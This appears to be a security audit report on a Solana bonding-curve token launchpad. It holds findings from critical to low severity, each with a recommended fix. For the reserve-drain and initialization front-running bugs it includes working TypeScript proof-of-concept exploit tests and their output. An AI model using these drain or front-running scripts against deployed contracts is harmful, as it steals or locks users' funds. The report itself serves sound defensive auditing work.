# Findings

## [C-01] Draining of the `BondingCurve` PDA leading the Locked User Funds and Attacker gains

### Description

An attacker can repeatedly buy and sell tokens from a given `BondingCurve` to drain its SOL reserves, preventing future sellers from withdrawing value. Additionally, if the attacker or a related entity is set as the `fee_recipient`, they can extract even more of the protocol’s funds through the fees.

The issue lies in the actual transferring logic at the end of `sell` instruction:

```rust
//transfer SOL back to user
let from_account = &ctx.accounts.bonding_curve.to_account_info();
let user = &ctx.accounts.user;
let fee_recipient = &ctx.accounts.fee_recipient;

transfer_lamports(from_account, user, sell_result.sol_amount)?; // Here we are sending the whole `sol_amount` to the user
transfer_lamports(from_account, fee_recipient, fee)?;           // and then also transfer the fee to the `fee_receipent`
```

Because the full `sol_amount` (before subtracting fees) is sent to the seller, plus an additional transfer of `fee` to `fee_recipient`, the Bonding Curve’s PDA is easily depleted through repeated buy–sell cycles.

### Impact - High

##### Liquidity Lock

Once the Bonding Curve’s PDA is drained, any further sell attempts by normal users fail due to insufficient lamports. Users are then left with tokens that can no longer be redeemed for SOL.


##### Attacker Profit

As said above and shown in the actual code snippet: If the attacker (or an allied address) acts as the `fee_recipient`, they can drain funds at minimal cost by repeatedly cycling buys and sells.

Even if an attacker is not the designated `fee_recipient`, they can still benefit through the **Tokenomics** Sociogram have publicly outlined. For instance, if the platform or protocol pays out **“creator rewards”**, “pumper participation,” or other incentives based on volume/trading (as shown in the provided screenshot), then an attacker can still profit while draining the Bonding Curve: 
- [Tokenomics - Creating a Memocoin/Bonding Curve](https://socio.gitbook.io/sociogram.org/meme-money-maker/how-to-create-a-memecoin#quality-based-ranking) 
- [Tokenomics - Revenue Streams (attacker gains)](https://socio.gitbook.io/sociogram.org/meme-money-maker/meme-money-maker-solution#multiple-revenue-streams)


#### Severity - High - anyone with enough SOL (around 0.07 SOL ~ 8 USD)

### Recommendations

1. **Subtract Fees Before Payout**  
   Instead of sending the entire `sol_amount`, send only `sol_amount - fee` to the user. For example:
   ```rust
   let sell_amount_minus_fee = sell_result.sol_amount - fee;
   transfer_lamports(from_account, user, sell_amount_minus_fee)?;
   transfer_lamports(from_account, fee_recipient, fee)?;
   ```
   This ensures the total SOL leaving the account is never more than `sell_result.sol_amount`.

2. **Add an Invariant Check**  
   After each trade, verify that the PDA’s actual lamport balance is at least equal to the recorded `real_sol_reserves`. For instance:
   ```rust
   require!(
       pda_lamports >= bonding_curve.real_sol_reserves,
       CustomError::PDAUnderflow
   );
   ```
   This helps detect or prevent reserves from going negative.


### Proof of Concept (TypeScript Test)

In the following scenario, two regular users purchase tokens from the Bonding Curve (thus funding the curve’s PDA), and an attacker then performs repeated buy-sell transactions to drain all of these lamports. Eventually, legitimate users can no longer sell.

```ts
it("drain bonding curve lamports and thus locking any user investment in a token", async () => {
    const attacker = anchor.web3.Keypair.generate();
    await fundAccountSOL(connection, attacker.publicKey, 420 * LAMPORTS_PER_SOL);

    const randomUser = anchor.web3.Keypair.generate();
    await fundAccountSOL(connection, randomUser.publicKey, 69 * LAMPORTS_PER_SOL);

    const randomUser2 = anchor.web3.Keypair.generate();
    await fundAccountSOL(connection, randomUser2.publicKey, 69 * LAMPORTS_PER_SOL);

    let attackerSolBalance = await connection.getBalance(attacker.publicKey);
    let randomUserSolBalance = await connection.getBalance(randomUser.publicKey);

    console.log("Start attacker SOL balance:", attackerSolBalance);
    console.log("Start randomUser SOL balance:", randomUserSolBalance);

    const newBondingCurve = await createBondingCurve(attacker);
    let bondingCurveSolBalance = await connection.getBalance(newBondingCurve.bondingCurvePDA);

    // Fetch the latest bonding curve state to see how many tokens remain
    let currentAMM = await getAmmFromBondingCurveCustom(newBondingCurve.bondingCurvePDA);
    console.log("Bonding initial balance: ", bondingCurveSolBalance);

    const tokensToBuy = 300_000_000_000n; // ~ 8580134 lamports with the Default Initial Parameters?

    // Calculate how much SOL we need (including fee)
    let buyPrice = currentAMM.getBuyPrice(tokensToBuy);
    if (!buyPrice) {
        throw new Error(`No buy price returned for ${tokensToBuy} tokens. AMM state: ${JSON.stringify(currentAMM)}`);
    }
    const fee = calculateFee(buyPrice, Number(DEFAULT_FEE_BASIS_POINTS));
    const maxSolAmount = buyPrice + fee;

    // Buy the tokens from randomUser
    let buyTx = await simpleBuyFromBondingCurve(randomUser, newBondingCurve.mint, newBondingCurve.bondingCurvePDA, 4n*tokensToBuy, 10n*maxSolAmount);

    // Buy the tokens from randomUser2
    buyTx = await simpleBuyFromBondingCurve(randomUser2, newBondingCurve.mint, newBondingCurve.bondingCurvePDA, 3n*tokensToBuy, 10n*maxSolAmount);

    bondingCurveSolBalance = await connection.getBalance(newBondingCurve.bondingCurvePDA);
    console.log("Bonding curve lamprots balance after the buy of the two normal users: ", bondingCurveSolBalance);

    const hackersTokensToBuy = 100n * tokensToBuy;

    // XXX: This loop is strictly for the parameters used above... however
    //      anytime the attacker forsees that the transaction isn't passing
    //      he will know that the bonding curve account is drained and thus
    //      all the randomUsers (1,2,....1000,...) will NOT be able to withdraw
    //      their funds => User Funds Locked
    for (let i = 0n; i < 13n; i++) {
        let currentAMMForHacker = await getAmmFromBondingCurveCustom(newBondingCurve.bondingCurvePDA);
        let buyPriceForAttacker = currentAMM.getBuyPrice(hackersTokensToBuy);

        if (!buyPriceForAttacker) {
            throw new Error(`No buy price returned for ${hackersTokensToBuy} tokens. AMM state: ${JSON.stringify(currentAMM)}`);
        }
        const feeHacker = calculateFee(buyPriceForAttacker, Number(DEFAULT_FEE_BASIS_POINTS));
        const maxSolAmountHacker = buyPriceForAttacker + feeHacker;

        // Buy the tokens from hacker
        const attackerBuyTx = await simpleBuyFromBondingCurve(attacker, newBondingCurve.mint, newBondingCurve.bondingCurvePDA, hackersTokensToBuy, 2n * maxSolAmountHacker);

        // Now sell in order to drain little by little the Bonding Curve ATA
        let ammAfterBuy = await getAmmFromBondingCurveCustom(newBondingCurve.bondingCurvePDA);
        let sellPrice = ammAfterBuy.getSellPrice(hackersTokensToBuy);
        if (!sellPrice) {
            throw new Error(`No sell price returned for ${hackersTokensToBuy} tokens. AMM state: ${JSON.stringify(ammAfterBuy)}`);
        }
        const sellFee = calculateFee(sellPrice, Number(DEFAULT_FEE_BASIS_POINTS));
        const minSolAfterFee =  1n;
        await simpleSellFromBondingCurve(attacker, newBondingCurve.mint, newBondingCurve.bondingCurvePDA, hackersTokensToBuy, minSolAfterFee);

        bondingCurveSolBalance = await connection.getBalance(newBondingCurve.bondingCurvePDA);
        console.log("Bonding curve lamprots balance after byuing then immedeialty selling tokens: ", bondingCurveSolBalance);
    }

    // XXX: For measuring how much SOL was needed to drain the BondingCurve ATA
    //      in the above scenario, where we have 2 normal users and one attacker
    //      The results: About 65_815_400 - 70_000_000 lamports ~ 0.07 SOL ~ 8 USD
    attackerSolBalance = await connection.getBalance(attacker.publicKey);
    console.log("Attacker SOL Balance after draining the Bonding Curve ATA:", attackerSolBalance);

    // XXX: Try to sell the tokens as the random User and see that
    //      you cannot sell them because the Bonding Curve ATA is drained...
    await simpleSellFromBondingCurve(randomUser, newBondingCurve.mint, newBondingCurve.bondingCurvePDA, 2n * tokensToBuy, 1n);
});
```

##### The test output

```
Start attacker SOL balance: 420000000000
Start randomUser SOL balance: 69000000000
Bonding initial balance:  1231920
Bonding curve lamprots balance after the buy of the two normal users:  60060944
Bonding curve lamprots balance after byuing then immedeialty selling tokens:  55729286
Bonding curve lamprots balance after byuing then immedeialty selling tokens:  51397628
Bonding curve lamprots balance after byuing then immedeialty selling tokens:  47065970
Bonding curve lamprots balance after byuing then immedeialty selling tokens:  42734312
Bonding curve lamprots balance after byuing then immedeialty selling tokens:  38402654
Bonding curve lamprots balance after byuing then immedeialty selling tokens:  34070996
Bonding curve lamprots balance after byuing then immedeialty selling tokens:  29739338
Bonding curve lamprots balance after byuing then immedeialty selling tokens:  25407680
Bonding curve lamprots balance after byuing then immedeialty selling tokens:  21076022
Bonding curve lamprots balance after byuing then immedeialty selling tokens:  16744364
Bonding curve lamprots balance after byuing then immedeialty selling tokens:  12412706
Bonding curve lamprots balance after byuing then immedeialty selling tokens:  8081048
Bonding curve lamprots balance after byuing then immedeialty selling tokens:  3749390
Attacker SOL Balance after draining the Bonding Curve ATA: 419921159620
    1) drain bonding curve lamports and thus locking any user investment in a token


  21 passing (22s)
  1 failing

  1) curve-launchpad
       drain bonding curve lamports and thus locking any user investment in a token:
     Error: Simulation failed. 
Message: Transaction simulation failed: Error processing Instruction 0: custom program error: 0x1776. 
Logs: 
[
  "Program HP1AdWRTGQbSAG6CXne7gGXsUzPnor8WfvxDuMvFaNAM invoke [1]",
  "Program log: Instruction: Sell",
  "Program TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA invoke [2]",
  "Program log: Instruction: Transfer",
  "Program TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA consumed 4645 of 173384 compute units",
  "Program TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA success",
  "Program log: Let's start transferiing (sell function) bondign curve lamports: 3749390",
  "Program log: AnchorError occurred. Error Code: InsufficientSOL. Error Number: 6006. Error Message: Insufficient SOL.",
].
```

In the logs, we can see an error: `InsufficientSOL` due to the PDA lamport balance being drained below the required amount. This confirms the protocol’s liquidity is **exhausted**, leaving users unable to redeem tokens for SOL.


## [M-01] `Global` Config can be initialized by an Attacker

### Description
The `Global` configuration, which governs the protocol’s administrative state, can be **initialized** by a malicious actor before the legitimate deployer calls the `initialize` method. By doing so, the attacker acquires full control as the *authority* in the program. This hijacks the deployment process and forces the original deployer to either redeploy or attempt another workaround. Even if the deployer attempts to redeploy, the attacker can repeat the same front-running technique, effectively preventing any legitimate initialization.

##### Current Implementation
Below is the relevant snippet from `initialize.rs`, which only checks whether the program was previously initialized, ignoring the potential for front-running:
```rust
pub fn initialize(ctx: Context<Initialize>) -> Result<()> {
    msg!("Calling initialize");
    let global = &mut ctx.accounts.global;

    // Currently, the only safeguard is whether global.initialized == false
    require!(!global.initialized, CurveLaunchpadError::AlreadyInitialized);

    // ...rest of initialization logic
}
```

### Impact - Medium
- **Complete Hijack**: An attacker who initializes the `Global` account first can perform privileged operations, such as pausing or unpausing the program, setting fees, or updating critical parameters.
- **Lockout**: The actual deployer can never create a valid `Global` config once the malicious version is set, unless they redeploy and somehow beat the attacker in calling `initialize` - which is *not guaranteed*.
- **Potential Program Reruns**: Without a safeguard, each new deployment attempt may be hijacked again, leading to indefinite disruption.

#### Severity - Medium

### Recommendation
Restrict who can call `initialize`. For example, hardcode or store the expected deploy authority’s public key in the program logic:

```rs
pub struct Initialize<'info> {
    #[account(
        mut,
        constraint = authority.key() == Pubkey::from_str(CREATION_AUTHORITY_PUBKEY).unwrap() @ ContractError::InvalidAuthority)
    ]
    authority: Signer<'info>,

    #[account(
        init,
        space = 8 + Global::INIT_SPACE,
        seeds = [Global::SEED_PREFIX],
        bump,
        payer = authority,
    )]
    global: Box<Account<'info, Global>>,

    system_program: Program<'info, System>,
}
```

By enforcing a specific address (or seed) as the required “initialization authority,” only the legitimate deployer can successfully initialize the `Global` account.

### Proof of Concept (TypeScript Test)
This excerpt demonstrates how any user - if quick enough - can front-run the call:

```ts
it("Attacker front-runs the global initialize", async () => {
  const attacker = anchor.web3.Keypair.generate();
  await fundAccountSOL(connection, attacker.publicKey, 69 * LAMPORTS_PER_SOL);

  // Attacker calls initialize first
  await program.methods
    .initialize()
    .accounts({ authority: attacker.publicKey })
    .signers([attacker])
    .rpc();

  // Confirm the attacker is now the authority
  const globalAccount = await program.account.global.fetch(globalPDA);
  assert.equal(globalAccount.authority.toBase58(), attacker.publicKey.toBase58());

  // The legitimate authority then attempts initialize and fails
  let didFail = false;
  try {
    await program.methods
      .initialize()
      .accounts({ authority: legitimateAuthority.publicKey })
      .signers([legitimateAuthority])
      .rpc();
  } catch (err) {
    didFail = true;
  }
  assert.isTrue(didFail, "Real deployer should fail because it's already initialized");

  // The attacker is now permanently in control.
});
```

## [M-02] Truncation of `u128` to `u64` leads to significant Fund Loss

### Description

In the `amm.rs` module, there is a mismatch between the `u128` fields inside the `AMM` struct and the `u64` fields in the accompanying `BuyResult` and `SellResult` structs. While the AMM calculations use `u128` (supporting very large values for reserves), these values are **unconditionally** truncated to `u64` in the returned buy and sell results, causing a potential overflow scenario.

When `virtual_sol_reserves` or `virtual_token_reserves` exceed `u64::MAX`, a perfectly valid `u128` calculation can yield results beyond the 64-bit range. This large result then gets coerced into `u64`, silently dropping high-order bits. The actual token or SOL amount from a trade can be drastically reduced from, e.g., **18'446'744'073'709'552'616** down to **1000**. This discrepancy effectively breaks the intended pricing logic and could severely devalue tokens.

##### Current Implementation:
Here is the problematic part (the same problem is in `apply_sell` also):

```rust
pub fn apply_buy(&mut self, token_amount: u128) -> Option<BuyResult> {
    let final_token_amount = if token_amount > self.real_token_reserves {
        self.real_token_reserves
    } else {
        token_amount
    };

    let sol_amount = self.get_buy_price(final_token_amount)?;
    msg!("[AMM] Pre-truncation sol_amount (u128): {}", sol_amount);

    self.virtual_token_reserves = self
        .virtual_token_reserves
        .checked_sub(final_token_amount)?;
    self.real_token_reserves = self.real_token_reserves.checked_sub(final_token_amount)?;

    self.virtual_sol_reserves = self.virtual_sol_reserves.checked_add(sol_amount)?;
    self.real_sol_reserves = self.real_sol_reserves.checked_add(sol_amount)?;

    // XXX: Critical truncation point
    let sol_amount_u64 = sol_amount as u64; 
    msg!("[AMM] Post-truncation sol_amount (u64): {}", sol_amount_u64);

    Some(BuyResult {
        token_amount: final_token_amount as u64,
        sol_amount: sol_amount as u64,
    })
}
```

### Impact - High
- **Severe Price Distortion**: The bonding curve no longer reflects actual supply or demand if large amounts are involved. A user may pay for what should be a “massive” purchase but only a tiny fraction of value changes hands (close to nothing...)

#### Severity - Low

### Recommendation
Add overflow checks whether a truncation lead to loss before casting:

```rust
if sol_amount > u64::MAX as u128 || final_token_amount > u64::MAX as u128 {
    msg!("[ERROR] Overflow detected - sol: {}, tokens: {}", sol_amount, final_token_amount);
    return None;
}
```


### Proof of Concept (Rust Test)
A simple test that reproduces the overflow scenario:

```rust
#[test]
fn test_u64_truncation() {
    let mut amm = AMM::new(
        u64::MAX as u128 + 1000, // Virtual SOL reserves well beyond u64
        1_000_000_000_000_000,
        0,
        1_000_000_000_000_000,
        1_000_000_000_000_000
    );

    // We expect an error or None, but the function still returns a 
    // truncated BuyResult with sol_amount drastically reduced
    let result = amm.apply_buy(500_000_000_000_000);

    println!("Result of apply_buy: {:?}", result);

    // This test fails, showing the function truncated and returned Some(...)
    // instead of detecting the overflow and aborting.
    assert!(result.is_none(), "Should fail due to u64 overflow, but didn't");
}
```

**Console Output** (example):
```
[AMM] Pre-truncation sol_amount (u128): 18446744073709552616
[AMM] Post-truncation sol_amount (u64): 1000
Some(BuyResult { token_amount: 500000000000000, sol_amount: 1000 })
thread '...test_u64_truncation' panicked:
   "Should fail due to u64 overflow" ...
```
The function returns `Some(...)` with the truncated value of 1000 instead of an error. This indicates a silent and severe loss of large numeric precision.

## [L-01] Lack of validation in global parameter updates

### Description

There is no validation of the parameters passed in `set_params`, which is the function responsible for changing **important** protocol parameters related to the `BondingCurves` launched like `initial_token_supply`, `virtual_sol_reserves` and other parameters that effectively **control** the price of new tokens.

##### Current Implementation

This is the actual code section where the `global` configuration is set without any checks on the fields passed:

```rust
pub fn set_params(
    ctx: Context<SetParams>,
    fee_recipient: Pubkey,
    withdraw_authority: Pubkey,
    initial: Reserves,
    initial_token_supply: u64,
    fee_basis_points: u64,
) -> Result<()> {
    let global = &mut ctx.accounts.global;

    // ...

    // XXX: No Validation of the passed parameters
    global.fee_recipient = fee_recipient;
    global.initial_virtual_token_reserves = initial.virtual_token_reserves;
    global.initial_virtual_sol_reserves = initial.virtual_sol_reserves;
    global.initial_real_token_reserves = initial.real_token_reserves;
    global.initial_token_supply = initial_token_supply;
    global.fee_basis_points = fee_basis_points;
    global.withdraw_authority = withdraw_authority;

    // ...
}
```

### Impact - Medium
- This lack of checks in the setter could lead to undefined and unwanted behaivour of the newly launched Tokens on the platform.

#### Severity - Low

### Recommendation
Consider adding comprehensive parameter validation like:

```rust
require!(
    params.fee_recipient != Pubkey::default(),
    CurveLaunchpadError::InvalidParameter
);
require!(
    params.withdraw_authority != Pubkey::default(),
    CurveLaunchpadError::InvalidParameter
);

require!(
    params.initial_virtual_token_reserves > 0,
    CurveLaunchpadError::InvalidParameter
);
require!(
    params.initial_virtual_sol_reserves > 0,
    CurveLaunchpadError::InvalidParameter
);
require!(
    params.initial_real_token_reserves > 0,
    CurveLaunchpadError::InvalidParameter
);
```

## [L-02] Missing State Inconsistency Check for Solana Rollbacks


### Description
The `Global` struct, which stores important protocol information, can become outdated if a Solana rollback occurs. Because there is no verification mechanism to detect or handle such rollbacks, the protocol can continue operating under old, invalid configuration parameters.

### Impact - Medium
By becoming outdated:

- Protocol could operate with old, invalid settings
- Potential for system malfunction or vulnerabilities
- When `set_params` relies on data that has effectively *rolled back* legitimate operations may fail, blocking the entire protocol flow

#### Severity - Low

### Recommendation
1. **Detect Outdated Configurations**:  
   Use the `LastRestartSlot` sysvar to confirm whether the current `Global` configuration is still valid.  
2. **Pause on Detected Rollback**:  
   Automatically pause the protocol if it appears to be running on stale settings, and require admin intervention (unpausing, re-initializing, etc.) to resume.  
3. **Implement Tracking**:  
   Add a `last_updated` field to `Global` and update it on each parameter change. Then use a helper function such as:
   ```rust
   fn is_config_outdated(global: &Global) -> Result<bool> {
       let last_restart_slot = LastRestartSlot::get()?;
       Ok(global.last_updated <= last_restart_slot.last_restart_slot)
   }
   ```
   to verify the protocol state against the most recent Solana restart or rollback.
